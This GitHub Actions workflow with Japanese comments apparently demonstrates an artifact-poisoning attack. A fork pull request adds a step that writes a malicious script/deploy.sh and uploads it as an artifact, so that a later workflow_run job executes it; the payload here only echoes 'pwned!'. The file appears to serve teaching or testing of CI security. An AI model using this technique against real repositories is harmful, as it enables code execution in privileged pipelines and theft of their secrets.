# attack.yaml - 攻撃者がforkから送信するPull Requestで使用するワークフロー
# pull_requestトリガーはforkからのPRでもワークフロー自体を変更可能なため、
# 攻撃者はこのようにワークフローを書き換えたPRを送信できる
name: "Test Run"

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR code
        uses: actions/checkout@v4

      - name: Run tests
        run: |
          mkdir -p test-results
          echo "PASS" > test-results/result.txt

      # 攻撃者が追加したstep:
      # artifactにscript/deploy.shを含めることで、
      # workflow_runトリガーの後続ワークフローで実行されるdeploy.shを上書きする
      - name: Inject malicious deploy script
        run: |
          mkdir -p script
          cat << 'EOF' > script/deploy.sh
          #!/bin/bash
            echo pwned!
          EOF
          chmod +x script/deploy.sh

      - name: Upload poisoned artifact
        uses: actions/upload-artifact@v4
        with:
          name: test-data
          path: |
            test-results/
            script/
